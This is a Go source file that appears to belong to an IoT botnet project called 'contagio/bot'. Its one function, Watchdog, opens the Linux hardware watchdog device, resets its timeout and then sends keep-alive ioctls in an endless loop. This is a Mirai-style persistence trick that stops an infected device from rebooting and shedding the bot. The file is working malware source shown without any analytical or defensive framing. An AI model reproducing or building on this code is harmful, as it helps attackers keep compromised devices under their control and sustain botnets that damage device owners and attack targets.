package main

import (
	"contagio/bot/config"
	"contagio/bot/methods"
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"
)

func Watchdog() {

	defer methods.Catch()

	var watchdogFd int
	var found bool
	timeout := 1

	file, err := os.OpenFile("/dev/watchdog", os.O_RDWR, 0)
	if err == nil {
		watchdogFd = int(file.Fd())
	} else if file, err := os.OpenFile("/dev/misc/watchdog", os.O_RDWR, 0); err == nil {
		watchdogFd = int(file.Fd())
	}

	if watchdogFd != 0 {
		fmt.Println("[watchdog] Watchdog found")
		found = true
		syscall.Syscall(syscall.SYS_IOCTL, uintptr(watchdogFd), uintptr(0x80045704), uintptr(unsafe.Pointer(&timeout)))
	}

	if found {
		if config.DEBUG {
			fmt.Println("[watchdog] Sending keep-alive ioctl")
		}
		for {
			syscall.Syscall(syscall.SYS_IOCTL, uintptr(watchdogFd), uintptr(0x80045705), 0)
			time.Sleep(10 * time.Second)
		}
	}

}
